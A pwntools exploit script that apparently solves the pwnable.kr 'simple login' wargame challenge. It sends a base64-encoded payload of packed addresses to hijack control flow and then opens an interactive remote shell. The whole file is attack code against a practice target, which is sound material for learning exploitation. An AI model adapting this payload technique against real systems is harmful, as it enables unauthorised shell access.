from pwn import *


class SimpleLoginExploit(object):

    CORRECT_INPUT_CHECK = 0xDEADBEEF
    CORRECT_ADDRESS = 0x0804925F
    INPUT_ADDRESS = 0x0811EB40

    def __init__(self) -> None:
        self.shell = remote('pwnable.kr', 9003)
        self.exploit_payload = ""

    def craft_exploit_payload(self):
        self.exploit_payload = p32(self.CORRECT_INPUT_CHECK) + p32(self.CORRECT_ADDRESS) + p32(self.INPUT_ADDRESS)
        self.exploit_payload = base64.b64encode(self.exploit_payload)

    def run(self):
        print(self.shell.recv())
        self.craft_exploit_payload()
        print("payload:")
        print(self.exploit_payload)
        self.shell.sendline(self.exploit_payload)
        print(self.shell.recv())
        self.shell.interactive()


if __name__ == '__main__':
    SimpleLoginExploit().run()
